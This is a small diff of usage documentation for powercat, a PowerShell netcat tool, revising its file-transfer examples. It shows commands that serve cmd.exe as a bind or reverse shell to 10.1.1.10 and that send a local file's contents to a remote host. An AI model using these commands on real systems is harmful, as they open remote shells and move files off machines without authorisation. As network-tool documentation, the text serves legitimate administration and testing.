@@ -18,10 +18,9 @@ Netcat: The powershell version. (v2 compatible)
         powercat -l -e cmd.exe 443
         powercat -c 10.1.1.10 -e cmd.exe 443
     Output to a File:
-        powershell -c '. .\powercat.ps1; powercat -l 443' > C:\outputfile
-    Send a File (String):
-        'The string I want to send' | powercat -l 443
-        [IO.File]::ReadAllText('C:\inputfile') | powercat -c 10.1.1.10 443
+        [IO.File]::WriteAllBytes('C:\outputfile',(powercat -o -l -p 8000))
+    Send a File:
+        powercat -i ([IO.File]::ReadAllBytes('C:\inputfile')) -c 10.1.1.10 -p 443
 ### powercat Relay Examples:
     Listener to Client Relay (TCP to TCP):
         powercat -l -p 8000 -r tcp:10.1.1.16:443
